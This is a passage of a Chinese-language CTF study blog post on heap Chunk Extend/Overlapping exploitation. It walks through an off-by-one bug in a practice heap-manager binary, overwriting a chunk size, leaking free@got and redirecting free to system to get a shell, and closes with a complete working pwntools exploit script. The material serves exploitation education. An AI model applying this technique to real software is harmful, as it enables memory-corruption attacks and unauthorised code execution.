<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720163129146.png" alt="image-20230720163129146"></p>
<h4 id="编辑一个堆"><a href="#编辑一个堆" class="headerlink" title="编辑一个堆"></a>编辑一个堆</h4><p>输入2执行此功能：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720163929221.png" alt="image-20230720163929221"></p>
<p>从上面的图可以看到，首先程序让我们输入堆的序列，根据这个序列来编辑对应的堆的内容。</p>
<p>（序列从0开始的）</p>
<h4 id="打印一个堆"><a href="#打印一个堆" class="headerlink" title="打印一个堆"></a>打印一个堆</h4><p>输入堆的序列以打印：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720164124086.png" alt="image-20230720164124086"></p>
<h4 id="删除一个堆"><a href="#删除一个堆" class="headerlink" title="删除一个堆"></a>删除一个堆</h4><p>输入堆的序列以删除。我们删除第二个堆</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720164254620.png" alt="image-20230720164254620"></p>
<p>并且用show查看一下堆已经被删除了。</p>
<p>可以看出，程序是一个堆管理器，有增删查改功能。</p>
<h4 id="分析struct结构体"><a href="#分析struct结构体" class="headerlink" title="分析struct结构体"></a>分析struct结构体</h4><p>每个content堆块用一个0x10的结构体去维护，结构体如下：</p>
<pre><code>struct chunk&#123;
    size_t size;		//context 大小
    _QWORD *chunk;		//context 指针
&#125;
</code></pre>
<p>具体代码就不分析了，主要看一下</p>
<h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDgtMDItN1hvRDVrU0tXazlYQWFWYi5wbmc?x-oss-process=image/format,png" alt="img"></p>
<p>可以看到 19 行写入数据的时候传入的长度参数被故意加 1 了，造成溢出可控的一字节。</p>
<h4 id="pwngdb调试"><a href="#pwngdb调试" class="headerlink" title="pwngdb调试"></a>pwngdb调试</h4><pre><code class="bash">pwndbg&gt; heap
0x603000 FASTBIN &#123;
  prev_size = 0, 
  size = 33, 
  fd = 0x18, 
  bk = 0x603030, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
&#125;
0x603020 FASTBIN &#123;
  prev_size = 0, 
  size = 33, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0xa, 
  bk_nextsize = 0x21
&#125;
0x603040 FASTBIN &#123;
  prev_size = 10, 
  size = 33, 
  fd = 0x603060, 
  bk = 0x603070, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
&#125;
0x603060 FASTBIN &#123;
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x6363636363636363, 
  fd_nextsize = 0xa, 
  bk_nextsize = 0x20f81
&#125;
0x603080 PREV_INUSE &#123;
  prev_size = 10, 
  size = 135041, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
&#125;
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x402000 r-xp     2000 0      
          0x601000           0x602000 r--p     1000 1000   
          0x602000           0x603000 rw-p     1000 2000   
          0x603000           0x624000 rw-p    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
</code></pre>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720170711370.png" alt="image-20230720170711370"></p>
<p>看一下堆的结构，堆是从0x603000开始的</p>
<p><img src="C:\Users\hubin\AppData\Roaming\Typora\typora-user-images\image-20230720171238392.png" alt="image-20230720171238392"></p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600258007510-fc2b387f-376e-4b83-8867-3ba1d7924d19.png" alt="img"></p>
<p>了解了堆内存布局，说一下思路</p>
<h4 id="触发off-by-one漏洞完成Extend"><a href="#触发off-by-one漏洞完成Extend" class="headerlink" title="触发off-by-one漏洞完成Extend"></a>触发off-by-one漏洞完成Extend</h4><p>可以看到两个结构体的content成员变量都指向内容chunk的data，我们回想一下在前面代码分析阶段发现修改功能存在off-by-one漏洞，那么怎么去利用呢？</p>
<ul>
<li>先从浅层看这个问题，我们修改的其实是heap内容的chunk而不是结构体本身的chunk，也就是说如果我们修改heap1的内容，如果触发off-by-one的话那影响的应该是heap2的结构体</li>
<li>再从深层看这个问题，在堆中如果低地址的块处于使用状态，那么相邻高地址的块的prev_size可以作为低地址块的data来使用</li>
</ul>
<p>把两个方面联系在一起：如果我们在申请heap_content的大小的时候范围涵盖下一个结构体的prev_size，那么在此修改heap_content的时候就会触发off-by-one漏洞，进而溢出的部分就会将相邻高地址的chunk的size给覆盖掉</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600329002654-98718dec-7cd8-4004-a684-bea0e8ef96a9.png" alt="QQ截图20200917154954.png"></p>
<p>我们试一下，重新使用gdb打开程序，这次我们第一个heap创建24个字节，在内容里写入24个字节的任意字符，第二个heap创建16个字节，然后ctrl + c回到调试界面，heap命令找到第一个chunk位置，x&#x2F;20gx + 地址查看一下：<br><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720171838277.png" alt="image-20230720171838277"></p>
<p>可以看到在heap1_content输入24个字节后将heap2结构体chunk的prev_size占满了，如果我们再一次修改heap1_content，写入25个字节后就会触发off-by-one漏洞将heap2结构体chunk的size覆盖掉。</p>
<p>实验一下，输入25个字符，aaaaaaaaaaaaaaaaaaaaaaaac</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720172226777.png" alt="image-20230720172226777"></p>
<p>chunk2块size字段果然被修改了。</p>
<p>那么既然我们可以通过这种方式改写size大小，就要好好设计一番，如果我们将size的值覆盖成0x41的话，在释放时heap2结构体chunk和heap2_content就会合并成一个0x40的块，重新申请之后就可以进一步操作了，先想好：</p>
<pre><code class="python">payload1.0 = 24个字节 + \x41
</code></pre>
<p>其实前面的24个字节还是可以利用起来的，在代码分析阶段我们发现在释放heap的时候首先释放的是heap_content的指针，这个指针指向的其实是heap_content的chunk中的data起始地址，这个过程是由free()函数完成的，free()函数的参数就是heap_content的data起始地址。那么如果我么想办法将free()函数替换成system()函数，并且在修改堆块内容的时候将字符串&#x2F;bin&#x2F;sh放在最前面，那么&#x2F;bin&#x2F;sh字符串的地址就会作为free函数的参数，即&#x2F;bin&#x2F;sh字符串会作为system()函数的参数，在释放这个堆块的时候就可以拿shell了！！！</p>
<pre><code class="python">payload2.0 = &quot;/bin/sh\x00&quot; + &quot;aaaaaaaaaaaaaaaa&quot; + &quot;\x41&quot;
</code></pre>
<p>&#x2F;bin&#x2F;sh\x00”字符串在data的起始位置，“aaaaaaaaaaaaaaaa” 用来占位”\x41”用来覆盖下一个heap_content的size，实际操作试一下：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600333777667-45329515-7dc8-42f8-8685-fc3ebc02b2fa.png" alt="QQ截图20200917170929.png"></p>
<p>再设置”\x41”,set  *0x603048&#x3D;0x41</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600333777667-45329515-7dc8-42f8-8685-fc3ebc02b2fa.png"></p>
<p>可以看到已经成功的部署好了&#x2F;bin&#x2F;sh字符串，并且将下一个heap2的size部分覆盖成了0x41。接下来的操作就和前面的原理一样了，我们需要释放掉heap2，也就是释放编号为1的heap。</p>
<p>释放chunk1’</p>
<pre><code class="python">free(1)
</code></pre>
<pre><code class="bash">pwndbg&gt; bin
fastbins
0x20: 0x603060 ◂— 0x20f81		//chunk1 content
0x30: 0x0
0x40: 0x603040 ◂— 0x21		//chunk1 struct
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
</code></pre>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200903143451796.png" alt="img"></p>
<p>首先释放的应该是heap_content，接着释放的是heap结构体，所以会在fastbin中存在两个chunk地址。重点是在fastbin中0x40这条链表上挂了我们extend之后的chunk，这就证明已经成功使heap结构体chunk与heap内容chunk合并了。当我再次申请的时候就可以对被extent的chunk进行操作了</p>
<h4 id="泄露free-函数真实地址"><a href="#泄露free-函数真实地址" class="headerlink" title="泄露free()函数真实地址"></a>泄露free()函数真实地址</h4><p>经过前面一系列步骤完成了以下：</p>
<ul>
<li>将”&#x2F;bin&#x2F;sh”字符串部署在heap1内容chunk的data处</li>
<li>通过off-by-one漏洞完成修改heap2结构体chunk的size值</li>
<li>成功extent heap2内容chunk</li>
</ul>
<p>前面已经提到过，我们的计划是将free()函数替换成system()函数，这样一来我们部署好的“&#x2F;bin&#x2F;sh”字符串就可以作为system()函数的参数了。但是这个程序本身并没有system()函数，所以就需要泄露出某一个函数的got表地址，进而通过pwntools的工具来找出libc基地址，加上偏移之后找到system()函数。那么首先第一步就是泄露，因为这个程序本身就存在free()函数，那么就直接泄露free_got了</p>
<p>上一步我们已经将extent的0x40大小的chunk准备好了，这一步直接在操作流程中申请0x30个字节的堆块就可以直接调用了。这里有一个点需要注意，在创建堆块的时候实际上申请的是两个chunk：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720175010398.png" alt="image-20230720175010398"></p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720175024201.png" alt="image-20230720175024201"></p>
<p>首先申请的是结构体chunk，然后申请的是内容chunk。这个已经说过很多遍了是吧，但是这里要强调的是由于结构体是自定义的，整个结构体只需要0x20个字节就够可以了，所以在申请结构体chunk的时候首先会在fastbin中查找是否有合适大小的chunk可以使用。此时fastbin的0x20链表中挂着之前释放掉的heap2结构体内容chunk，所以刚刚好0x20个字节，这0x603060部分的空间就被启用了。接下来由于申请内容大小为0x30，所以fastbin的0x40链表中刚好有之前extent_chunk，所以0x603040这部分的空间就被启用了。</p>
<p>需要注意的是：<code>0x603060先被启用，0x603040后被启用</code>，这就意味着先被启用的0x20的chunk 会被0x40的chunk所覆盖！！！</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/1600337870008-03e11c86-d8b9-4425-b86c-28e424de2b2e.png" alt="QQ截图20200917181646.png"></p>
<p>请注意，绿色框中的chunk先被启用，红色框中的chunk后被启用，如果在红色chunk中写东西，绿色chunk就会被覆盖。</p>
<p>既然内容chunk可以覆盖结构体的content成员变量，那么我们将content成员变量的指针覆盖成free_got指针，然后再打印这个0x30的heap，这样一来打印的最终目的地就指向了free函数的真实地址了：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904141431279.png" alt="img"></p>
<p>那么这样一来重新申请0x30heap的时候填写内容时payload:</p>
<pre><code class="python">payload = p64(0) * 3 + p64(0x21) + p64(0x30) + p64(heap.got[&#39;free&#39;])
</code></pre>
<p>接下来回到操作流程界面，我们打印一下这个0x30的heap，free函数地址就会被打印出来了，但是在接收打印出来的内容时需要处理一下：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904142734299.png" alt="img"></p>
<pre><code class="python">sh.recvuntil(&quot;Content : &quot;)
data = sh.recvuntil(&quot;Done !&quot;)
free_addr = u64(data.split(&quot;\n&quot;)[0].ljust(8, &quot;\x00&quot;))
</code></pre>
<h4 id="将free-函数替换成system-函数"><a href="#将free-函数替换成system-函数" class="headerlink" title="将free()函数替换成system()函数"></a>将free()函数替换成system()函数</h4><p>在得到了free()函数地址之后就可以用我们的老方法，先找到libc基地址，再加上system()函数偏移得到system()函数地址：</p>
<pre><code class="python">libc_base = free_addr - libc.symbols[&#39;free&#39;]
log.success(&#39;libc base addr: &#39; + hex(libc_base))
system_addr = libc_base + libc.symbols[&#39;system&#39;]
</code></pre>
<p>这样一来就找到了system()函数，接下来就需要考虑的是怎么将free()函数地址替换成system()函数地址了。其实我们可以重新编辑0x30这个heap来实现对free_got中的内容：</p>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/20200904143946479.png" alt="img"></p>
<p>在对内容进行修改时，依然还是修改heap结构体中content成员变量指向的free_got中的内容，所以我们再一次修改的时候就可以直接将free_got指向的free_addr修改成system_addr,即修改free_got表中的free函数真实地址为system函数地址。</p>
<p>因为调用free()函数的时候程序也是去free_got指向的位置找函数地址，那么这样一来在程序调用free()函数的时候实际上调用的确实system()函数了</p>
<ul>
<li>原执行流程：free(binsh_addr)</li>
<li>替换后执行流程：system(&#x2F;bin&#x2F;sh)</li>
</ul>
<p>所以当我们释放第一个heap的时候就可以拿shell了</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *

sh = process(&#39;./test&#39;)
heap = ELF(&#39;./test&#39;)
libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)


def create(size, content):
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(b&quot;1&quot;)
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(str(size))
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(content)


def edit(idx, content):
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(b&quot;2&quot;)
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(str(idx))
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(content)


def show(idx):
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(b&quot;3&quot;)
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(str(idx))


def delete(idx):
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(b&quot;4&quot;)
    sh.recvuntil(b&quot;:&quot;)
    sh.sendline(str(idx))
    

create(0x18, &quot;hollk&quot;)  
create(0x10, &quot;hollk&quot;)  

edit(0, &quot;/bin/sh\x00&quot; + &quot;a&quot; * 0x10 + &quot;\x41&quot;)

delete(1)

create(0x30, p64(0) * 3 + p64(0x21) + p64(0x30) + p64(heap.got[&#39;free&#39;]))  
show(1)
sh.recvuntil(&quot;Content : &quot;)
data = sh.recvuntil(&quot;Done !&quot;)

free_addr = u64(data.split(b&quot;\n&quot;)[0].ljust(8, b&quot;\x00&quot;))

libc_base = free_addr - libc.symbols[&#39;free&#39;]
log.success(&#39;libc base addr: &#39; + hex(libc_base))
system_addr = libc_base + libc.symbols[&#39;system&#39;]

edit(1, p64(system_addr))
#gdb.attach(hollk)
delete(0)
sh.interactive()
</code></pre>
<p><img src="https://zhu-yuan.oss-cn-beijing.aliyuncs.com/Blog/image-20230720182632540.png" alt="image-20230720182632540"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io">主元</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/">https://zhuyuan1213.github.io/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zhuyuan1213.github.io" target="_blank">zhuyuan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/study/">study</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/heap/">heap</a><a class="post-meta__tags" href="/tags/Chunk-Extend/">Chunk Extend</a><a class="post-meta__tags" href="/tags/Overlapping/">Overlapping</a></div><div class="post_share"><div class="social-share" data-image="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/24/NSSCTF-whitegive_pwn/"><img class="prev-cover" src="https://w.wallhaven.cc/full/rr/wallhaven-rrjvyq.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NSSCTF-whitegive_pwn</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"><img class="next-cover" src="https://w.wallhaven.cc/full/zy/wallhaven-zy5omo.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN-栈保护机制</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/24/unsortedbin%E7%9A%84unlink/" title="unsortedbin的unlink"><img class="cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">unsortedbin的unlink</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86-UAF%EF%BC%88Use%20After%20Free%EF%BC%89/" title="堆-UAF（Use After Free）"><img class="cover" src="https://w.wallhaven.cc/full/3l/wallhaven-3lrqpy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆-UAF（Use After Free）</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" title="堆中的off-by-one"><img class="cover" src="https://w.wallhaven.cc/full/w8/wallhaven-w8m9w7.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆中的off-by-one</div></div></a></div><div><a href="/2023/07/24/%E5%A0%86%E5%85%A5%E9%97%A8%E6%A6%82%E8%BF%B0/" title="堆入门概述"><img class="cover" src="https://w.wallhaven.cc/full/ex/wallhaven-exwgw8.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">堆入门概述</div></div></a></div><div><a href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img class="cover" src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">Canary保护机制以及常用绕过手段</div></div></a></div><div><a href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img class="cover" src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">ELF文件格式</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">主元</div><div class="author-info__description">二进制ing</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhuyuan1213/zhuyuan1213.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">献给热爱的一切~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chunk-Extend-x2F-Overlapping-%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0"><span class="toc-number">1.</span> <span class="toc-text">Chunk Extend&#x2F;Overlapping | 堆拓展、重叠</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.0.1.</span> <span class="toc-text">参考资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞利用的必要条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B1%EF%BC%9A%E5%AF%B9inuse%E7%9A%84fastbin%E8%BF%9B%E8%A1%8Cextend"><span class="toc-number">1.0.4.</span> <span class="toc-text">基本示例1：对inuse的fastbin进行extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-2%EF%BC%9A%E5%AF%B9-inuse-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.0.5.</span> <span class="toc-text">基本示例 2：对 inuse 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-3%EF%BC%9A%E5%AF%B9-free-%E7%9A%84-smallbin-%E8%BF%9B%E8%A1%8C-extend"><span class="toc-number">1.0.6.</span> <span class="toc-text">基本示例 3：对 free 的 smallbin 进行 extend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-4%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%90%8E%E5%90%91-overlapping"><span class="toc-number">1.0.7.</span> <span class="toc-text">基本示例 4：通过 extend 后向 overlapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%A4%BA%E4%BE%8B-5%EF%BC%9A%E9%80%9A%E8%BF%87-extend-%E5%89%8D%E5%90%91-overlapping"><span class="toc-number">1.0.8.</span> <span class="toc-text">基本示例 5：通过 extend 前向 overlapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.0.9.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">检查保护机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">程序流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E7%95%8C%E9%9D%A2"><span class="toc-number">1.0.9.3.</span> <span class="toc-text">主界面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.4.</span> <span class="toc-text">创建一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.5.</span> <span class="toc-text">编辑一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.6.</span> <span class="toc-text">打印一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E4%B8%80%E4%B8%AA%E5%A0%86"><span class="toc-number">1.0.9.7.</span> <span class="toc-text">删除一个堆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90struct%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.0.9.8.</span> <span class="toc-text">分析struct结构体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.9.</span> <span class="toc-text">漏洞函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwngdb%E8%B0%83%E8%AF%95"><span class="toc-number">1.0.9.10.</span> <span class="toc-text">pwngdb调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91off-by-one%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%88%90Extend"><span class="toc-number">1.0.9.11.</span> <span class="toc-text">触发off-by-one漏洞完成Extend</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2free-%E5%87%BD%E6%95%B0%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80"><span class="toc-number">1.0.9.12.</span> <span class="toc-text">泄露free()函数真实地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86free-%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E6%88%90system-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.13.</span> <span class="toc-text">将free()函数替换成system()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.0.10.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/2023-7-24-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出"><img src="https://w.wallhaven.cc/full/2k/wallhaven-2k7e79.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="整数溢出"/></a><div class="content"><a class="title" href="/2023/07/24/2023-7-24-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary保护机制以及常用绕过手段"/></a><div class="content"><a class="title" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段">Canary保护机制以及常用绕过手段</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" 